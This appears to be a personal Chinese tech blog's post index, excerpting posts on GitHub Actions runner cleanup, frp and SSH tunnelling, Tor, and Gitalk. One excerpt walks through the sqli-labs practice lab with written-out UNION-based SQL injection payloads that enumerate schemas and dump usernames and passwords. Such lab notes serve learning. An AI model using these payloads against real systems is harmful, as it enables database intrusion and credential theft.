<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Posts | Avalon</title>
<meta name=keywords content><meta name=description content="Posts - Avalon"><meta name=author content><link rel=canonical href=https://littlestate.github.io/posts/><link crossorigin=anonymous href=/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css integrity="sha256-1vzSCk+4bvpN+sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as=style><link rel=icon href=https://littlestate.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://littlestate.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://littlestate.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://littlestate.github.io/apple-touch-icon.png><link rel=mask-icon href=https://littlestate.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://littlestate.github.io/posts/index.xml><link rel=alternate hreflang=en href=https://littlestate.github.io/posts/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://littlestate.github.io/posts/"><meta property="og:site_name" content="Avalon"><meta property="og:title" content="Posts"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="website"><meta name=twitter:card content="summary"><meta name=twitter:title content="Posts"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://littlestate.github.io/posts/"}]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://littlestate.github.io/ accesskey=h title="Avalon (Alt + H)">Avalon</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><header class=page-header><h1>Posts</h1></header><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Github Actions Self-Hosted 自动清理工作空间</h2></header><div class=entry-content><p>使用 self-hosted 当使用自建的 runner 时，checkout 插件并没有自动清空工作空间，这时可以使用环境变量配置前置、后置脚本。
ACTIONS_RUNNER_HOOK_JOB_STARTED=/opt/actions-runner/scripts/cleanup.sh
ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/opt/actions-runner/scripts/cleanup.sh
#!/usr/bin/env bash rm -rf $GITHUB_WORKSPACE/* rm -rf $GITHUB_WORKSPACE/.??* 使用 self-hosted container 当使用 container 时就遇到问题了，我的 runner 使用单独的用户运行，并且没有 sudo 权限，而容器运行后，生成的工作空间全为 root 权限，导致我的后置任务，也无法删除。
这时可以使用容器来提权，修改工作空间的权限后再执行删除操作。
cleanup.sh 脚本:
#!/usr/bin/env bash # ================================================ # 文件路径 /opt/actions-runner/scripts/cleanup.sh # ================================================ if [ -n "${GITHUB_WORKSPACE}" ]; then docker run --rm \ -v $GITHUB_WORKSPACE/../../:/workspace \ busybox:latest \ /bin/sh -c "chown -R $(id -u):$(id -g) /workspace" rm -rf ${GITHUB_WORKSPACE}/{.??*,*} fi 配置 .env 使用该清理脚本，需要在 /opt/actions-runner/.env 文件中添加环境变量，之后运行 sudo ./svc.sh stop && sudo ./svc.sh start 重启 runner
...</p></div><footer class=entry-footer><span title='2024-12-30 10:35:00 +0800 CST'>December 30, 2024</span></footer><a class=entry-link aria-label="post link to Github Actions Self-Hosted 自动清理工作空间" href=https://littlestate.github.io/posts/github-actions-self-hosted-%E8%87%AA%E5%8A%A8%E6%B8%85%E7%90%86%E5%B7%A5%E4%BD%9C%E7%A9%BA%E9%97%B4/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>My First Post</h2></header><div class=entry-content><p>title 已迁移至 Hugo 并使用 Github Actions 强力驱动</p></div><footer class=entry-footer><span title='2024-12-28 01:06:37 +0800 CST'>December 28, 2024</span></footer><a class=entry-link aria-label="post link to My First Post" href=https://littlestate.github.io/posts/my-first-post/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>通过公网 IP 使用 RDP 与 WOL</h2></header><div class=entry-content><p>frp 在还没有公网 IP 时，通过 frp 将 3389 端口映射出来，通过 RDP 访问到主机后进行以下的操作。
DDNS 首先在红米 AC2100 中支持的 DDNS 服务商中选择了 no-ip.com。 注册并将配置好的 Hostname 填写到路由器的 DDNS 中，用户名就是注册 no-ip.com 时的。 远程开机 上面配置完后应该就可以通过域名来远程控制主机了，但是还没法远程开机。
开启主板 BIOS 中的 wake on lan。 勾选电脑网卡中的以下选项
开启以下选项
关闭电源中的快速启动（重要！）
给路由器添加静态 arp 编辑 /etc/rc.local在exit的上一行加入arp -s 192.168.31.XXX xx:xx:xx:xx:xx:xx就可以了。
参考：
AC2100官方固件开启SSH方法 小米路由器成功外网WOL唤醒 小米、红米 AC2100 一键开启 SSH，可自定义安装各种插件</p></div><footer class=entry-footer><span title='2021-11-28 17:57:57 +0000 UTC'>November 28, 2021</span></footer><a class=entry-link aria-label="post link to 通过公网 IP 使用 RDP 与 WOL" href=https://littlestate.github.io/posts/%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91-ip-%E4%BD%BF%E7%94%A8-rdp-%E4%B8%8E-wol/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>frp 配置并设为启动项</h2></header><div class=entry-content><p>一般配置 ; frps.ini [common] bind_port = 7000 token = &lt;token> vhost_http_port = 8080 dashboard_port = 7900 dashboard_user = &lt;user> dashboard_pwd = &lt;pwd> bind_port 是 frp 服务端、客户端连接时使用的端口号。 token 是用来鉴权的。 vhost_http_port 是下面配置的 [web] 服务穿透出来的端口，可以通过访问公网 vps 的这个端口访问到 [web]。 dashboard 是在 vps 上开启了一个 web 管理页面。 ; frpc.ini [common] server_addr = &lt;ip_addr> server_port = 7000 token = &lt;token> [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 ; 让外网可以访问到内网的某个 Web 服务 [web] type = http local_ip = 127.0.0.1 local_port = 80 custom_domains = &lt;domain> ; Remote Desktop Protocol [rdp] type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 3389 token 必须和服务端相同。 [ssh] 的 remote_port 是在公网 vps 上监听了 6000 端口，通过这个端口就可以访问到 [ssh] 设定好的 local_port。 [web] 的 custom_domains 可以是本机 host 文件静态解析的域名。 stcp 上面 tcp 仅需要 vps 配置好 fprs 客户端使用 frpc 连接就好。而 stcp 多了一步验证，vps 中的 frps.ini 配置还是和上面相同
...</p></div><footer class=entry-footer><span title='2021-11-26 16:09:21 +0000 UTC'>November 26, 2021</span></footer><a class=entry-link aria-label="post link to frp 配置并设为启动项" href=https://littlestate.github.io/posts/frp-%E9%85%8D%E7%BD%AE%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%90%AF%E5%8A%A8%E9%A1%B9/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>SQLI-LABS</h2></header><div class=entry-content><p>CRUD 查库：SELECT schema_name FROM information_schema.schemata 查表：SELECT table_name FROM information_schema.tables WHERE table_schema='security' 查列：SELECT column_name FROM information_schema.columns WHERE table_name='users' 查字段：SELECT username, password FROM security.users 一些函数 SELECT SYSTEM_USER(); SELECT USER(); SELECT DATABASE(); SELECT VERSION(); SELECT @@datadir; – 查看 mysql 路径 SELECT @@version_compile_os; – 查看版本 注入 查看是否有注入：
?id=1' 查看有多少列：
?id=1' ORDER BY 10 --+ 查看哪些数据可以回显：
?id=-1' UNION SELECT 1,2,3 --+ 查看当前数据库：
?id=-1' UNION SELECT 1,2,DATABASE() --+ 查看数据库： 显示下标为2开始后的1位数据
?id=-1' UNION SELECT 1,2,schema_name FROM information_schema.schemata LIMIT 2,1 --+ 在第三列显示所有数据库名
?id=-1' UNION SELECT 1,2,GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata --+ 查表 手动筛选
?id=-1' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1 --+ 显示所有
?id=-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security' --+ 查列 ?id=1' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_schema='security' --+ ?id=1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' --+ 查数据 ?id=-1' UNION SELECT 1,2,CONCAT_WS('~', username, password) FROM security.users LIMIT 0,1 --+ ?id=-1' UNION SELECT 1,2,GROUP_CONCAT(CONCAT_WS('~', username, password)) FROM security.users --+</p></div><footer class=entry-footer><span title='2021-11-24 01:55:24 +0000 UTC'>November 24, 2021</span></footer><a class=entry-link aria-label="post link to SQLI-LABS" href=https://littlestate.github.io/posts/sqli-labs/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>SSH Port Forwarding</h2></header><div class=entry-content><p>动态转发 因为 SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，动态转发只需要把本地端口绑定到 SSH 服务器，所以叫动态转发。
$ ssh -D port tunnel-host -N D 表示动态转发，所有经过这个本地监听端口的流量，都通过 SSH 隧道。
N 参数用于端口转发，表示建立的 SSH 只用于端口转发，不能执行远程命令，这样可以提供安全性。
本地转发（正向代理） $ ssh -L port:host:hostport tunnel-host -N 上面就是将 tunnel-host 作为跳板机，在本地 port 端口与目标服务器（这里是 host）的 hostport　端口之间建立了一个 ssh 隧道。
$ ssh -L 8080:www:80 tunnel-host -N 访问 clienthost 8080 端口时，就相当于通过跳板服务器 tunnel-host 访问 www:80。
www:80 可以是跳板机局域网中的一个设备。
远程转发（反向代理） $ ssh -R port:host:hostport tunnel-host -N 访问 tunnel-host:port 会访问到本地的 host:hostport，可以通过这个功能将本地服务转发出去。
$ ssh -R 8080:192.168.1.100:80 root@x.x.x.x -p 0~65535 -N 如上，访问公网 x.x.x.x:8080 端口的话，可以访问到内网的 192.168.1.100:80。
...</p></div><footer class=entry-footer><span title='2021-11-23 22:31:45 +0000 UTC'>November 23, 2021</span></footer><a class=entry-link aria-label="post link to SSH Port Forwarding" href=https://littlestate.github.io/posts/ssh-port-forwarding/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>洋葱路由</h2></header><div class=entry-content><p>…
简介 洋葱路由（英语：Onion routing）为一种在电脑网络上匿名沟通的技术。在洋葱路由的网络中，消息一层一层的加密包装成像洋葱一样的数据包，并经由一系列被称作洋葱路由器的网络节点发送，每经过一个洋葱路由器会将数据包的最外层解密，直至目的地时将最后一层解密，目的地因而能获得原始消息。而因为透过这一系列的加密包装，每一个网络节点（包含目的地）都只能知道上一个节点的位置，但无法知道整个发送路径以及原发送者的地址。
原理 用户都希望能隐藏自己的真实 ip 地址，让对方无法精准定位找到自己。此时可以找个代理服务器转发流量。最常见的方式就是代理，图示如下： 但是正常情况下，server 是有日志的，记录了 proxy 的 ip 地址（如果 server 在国内，运营商也有相应的记录）；同时国内的运营商也有 client 的访问记录。所以用这样的方式来隐藏真实 IP 是不可行的。
增加到两个 proxy 节点 client->proxy1：国内运营商知道 client 给 proxy1 发数据了 proxy1->proxy2：由于两个节点都在海外，正常情况下，国内运营商是不知道这层代理关系的 proxy2->server：正常情况下，server 有日志记录；如果 server 在国内，国内的运营商也有记录 关键的是 proxy1->proxy2：别人无法拿到这两个节点的数据，所以不好追查 既然两个 proxy 已经不好追查了，那么继续增加 proxy 节点到 3 个，如实现了匿名通信的自由软件 tor 简单的核心原理： 使用 tor 浏览器访问网页，除了走正常的 http/https 协议的流程外，tor 还需要先访问目录服务器，从目录服务器拿到中继服务器的地址和公钥（这是 tor 的致命问题之一：目录服务器的数量有限，一旦屏蔽目录服务器，tor 浏览器就用不了了）src/app/config/ 这里面存放了主备用目录服务器的 ip 地址、端口和 id 再通过中继服务器层层加密并转发流量。（使用非对称加密） 建立通信的过程 客户端与目录服务器建立链接，并从目录服务器中选取一个时延最低的服务器作为第一个中继服务器OR1； 客户端向OR1发送一个请求建链请求，OR1验证完客户端的合法性后生成一对密钥（公钥pubkey_OR1_Client、私钥prikey_OR1_Client）,然后将公钥pubkey_OR1_Client发回给客户端（至此，客户端成功的建立了其与OR1的通信链路）； 客户端又从目录服务器中选择一个时延最低的中继服务器OR2，并向OR1发送一个数据包：使用pubkey_OR1_Client加密OR2的地址； OR1收到数据包后使用prikey_OR1_Client解开数据包，发现是一个让其自身与另外一个服务器OR2建立链接的请求，那么OR1重复步骤2与OR2建立链接，并将OR2返回的OR1与OR2链路的公钥pubkey_OR1_OR2返回给客户端； 客户端重复步骤3、4，建立OR2与OR3之间的通信链路，并接收到OR2与OR3之间链路的公钥pubkey_OR2_OR3； 至此，客户端与3个中继服务器之间的链路/circuit已经成功建立，客户端拥有3把公钥：pubkey_Client_OR1、pubkey_OR1_OR2、pubkey_OR2_OR3。 通信链路建立了，接下来该发数据了： 客户端将要发送的数据（data）经过3层加密包裹：*第一层：使用pubkey_OR2_OR3加密data：pubkey_OR2_OR3(data)；*第二层：使用pubkey_OR1_OR2加密第一层加密后的数据：pubkey_OR1_OR2(pubkey_OR2_OR3(data))；*第三层：使用pubkey_Client_OR1加密第二层机密后的数据： pubkey_Client_OR1(pubkey_OR1_OR2(pubkey_OR2_OR3(data)))； OR1收到客户端发来的数据后使用其与Client链路的私钥prikey_Client_OR1解开数据包，发现数据包是发往OR2的，那么OR1就将解开后的数据包发送给OR2； OR2收到OR1发来的数据包重复OR1的步骤：将接收的数据包解开发往OR3； OR3收到数据包后，使用prikey_OR2_OR3解开数据包，这个时候的数据包是客户端要发往目的服务器的真实数据包data。此时，OR3就将data路由给目标服务器。 这就是洋葱名称的来源：数据被公钥层层加密发送。每个中继节点收到数据后都用自己保存的私钥层层解密，直到看到最终的目的数据包； 缺点 并不是绝对的安全，因为最后一个节点和目的节点的链路是公开透明的。 长时间用同一条链路，也容易通过类似超级ping的工具猜出真实的ip地址，所以tor会不定时更换链路 比较明显的特征如下： TCP前面3次握手后建立连接 然后发送4个数据包，每个包的格式、长度完全一样 这也是tor的弱点之一： 浏览器和osbf之间的通信格式是固定的，很容易通过机器学习的模型、甚至是人为预设的规则检测到。 大蒜路由I2P tor是匿名通信的鼻祖，但还是有比较明显的缺陷： （1）上面提到的目录服务器。一旦被防火墙ban，tor浏览器分分钟失效 （2）一旦建立通信连接，双方用这条线路互相传数据；使用时间稍微长一点的话，有一定的概率被猜到； 为了解决这些痛点，大蒜路由孕育而生！ I2P使用 Kad 算法（用过电驴或电骡的网友应该听说过）来获取网络节点的信息，将传输的原始数据拆散为加密数据包通过多条隧道交叉疏散传递，其优势如下：
...</p></div><footer class=entry-footer><span title='2021-06-18 00:28:57 +0000 UTC'>June 18, 2021</span></footer><a class=entry-link aria-label="post link to 洋葱路由" href=https://littlestate.github.io/posts/%E6%B4%8B%E8%91%B1%E8%B7%AF%E7%94%B1/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Minecraft 小镇建设日志</h2></header><div class=entry-content><p>IP(内网) : 172.17.216.183 基地 矿工之家 刷经验 附魔台 地狱门 小型农场 竹林 天然废弃矿洞 仓库（迁移中） 平原基地 村庄 附魔台 地狱门 基础设施 铁路（建设中） 平原->地下基地 计划中 农场 牧场 冰堡 1:1 还原学校 居民 XiaoBang：普通民众 Fritz1u：建筑师 NTYngln：工程师</p></div><footer class=entry-footer><span title='2021-05-30 05:55:07 +0000 UTC'>May 30, 2021</span></footer><a class=entry-link aria-label="post link to Minecraft 小镇建设日志" href=https://littlestate.github.io/posts/minecraft-%E5%B0%8F%E9%95%87%E5%BB%BA%E8%AE%BE%E6%97%A5%E5%BF%97/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>GITALK</h2></header><div class=entry-content><p>为小窝增加评论系统
部署 GITALK 首先创建 Github Application GITALK 配置 enable: true github_id: &lt;Github 账号> # GitHub repo owner repo: &lt;用来存放评论的仓库> # Repository name to store issues client_id: &lt;上面注册的> # GitHub Application Client ID client_secret: &lt;&lt;上面注册的>> # GitHub Application Client Secret admin_user: &lt;初始化仓库的账号> proxy: https://cors-anywhere.herokuapp.com/https://github.com/login/oauth/access_token # This is official proxy adress Workers 配置 whitelist = [ ".*" ] # 所有请求可用 whitelist = [ "^http.?://littlestate.github.io$", "littlestate.github.io$" ] 最后一步 将 https://cors-anywhere.herokuapp.com 替换为 Workers 中右边的地址 让标签和分类页不显示 GITALK 评论框 在 hexo/source 下 tags、categories 文件夹内的 index.md 中添加 comments: false 参考 使用 CloudFlare Workers 反向代理 cors-anywhere 框架</p></div><footer class=entry-footer><span title='2021-05-30 04:02:15 +0000 UTC'>May 30, 2021</span></footer><a class=entry-link aria-label="post link to GITALK" href=https://littlestate.github.io/posts/gitalk/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>子网划分</h2></header><div class=entry-content><p>…
...</p></div><footer class=entry-footer><span title='2021-05-14 09:12:44 +0000 UTC'>May 14, 2021</span></footer><a class=entry-link aria-label="post link to 子网划分" href=https://littlestate.github.io/posts/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/></a></article><footer class=page-footer><nav class=pagination><a class=next href=https://littlestate.github.io/posts/page/2/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2024 <a href=https://littlestate.github.io/>Avalon</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>